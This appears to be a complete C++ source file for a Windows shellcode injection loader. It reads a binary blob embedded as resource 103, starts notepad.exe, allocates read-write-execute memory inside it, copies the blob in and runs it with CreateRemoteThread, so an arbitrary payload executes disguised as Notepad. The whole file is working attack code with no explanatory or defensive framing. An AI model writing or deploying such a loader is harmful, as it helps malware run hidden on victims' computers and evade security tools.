#include "pch.h"
#include <iostream>
#include <windows.h>

int main()
{
	STARTUPINFOA si;
	PROCESS_INFORMATION pi;
	ZeroMemory(&si, sizeof(si));
	si.cb = sizeof(si);
	ZeroMemory(&pi, sizeof(pi));

	HRSRC hRsc = FindResourceExW(NULL, RT_RCDATA, MAKEINTRESOURCE(103), MAKELANGID(LANG_NEUTRAL, SUBLANG_NEUTRAL));
	if (hRsc == 0)
	{
		int err = GetLastError();
		printf("FindResource Error: %d", err);
	}
	else
	{
		printf("FindResource suceeded. \nHandle: %s", hRsc);
		HGLOBAL hData = LoadResource(NULL, hRsc);
		if (hData == 0)
		{
			int err = GetLastError();
			printf("\nLoadResource Error: %d", err);
		}
		else
		{
			DWORD sizeRsc = SizeofResource(NULL, hRsc);
			printf("\nSize: %d", sizeRsc);
			printf("\nPTR to Data: %d", hData);
			BOOL bProc = CreateProcessA((LPCSTR)"C:\\Windows\\System32\\notepad.exe", (LPSTR)NULL, (LPSECURITY_ATTRIBUTES)NULL, (LPSECURITY_ATTRIBUTES)NULL, (BOOL)FALSE, (DWORD)CREATE_NEW_CONSOLE, (LPVOID)NULL, (LPCSTR)NULL, (LPSTARTUPINFOA)&si, (LPPROCESS_INFORMATION)&pi);
			if (bProc == 0)
			{
				printf("CreateProcess Failed.....");
			}
			else
			{
				HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pi.dwProcessId);
				if (hProc == 0)
				{
					printf("\nOpenProcess failed!");
				}
				else
				{
					LPVOID newMem = (LPVOID)VirtualAllocEx(hProc, NULL, sizeRsc, MEM_RESERVE | MEM_COMMIT, 0x40);
					if (!WriteProcessMemory(hProc, (LPVOID)newMem, hData, sizeRsc, NULL))
					{
						int err = GetLastError();
						printf("WriteProcessMemory Error: %d", err);
					}
					else
					{
						CreateRemoteThread(hProc, NULL, 0, (LPTHREAD_START_ROUTINE)newMem, NULL, 0, NULL);
					}
				}
		}
	}

	
		
	}
	
}

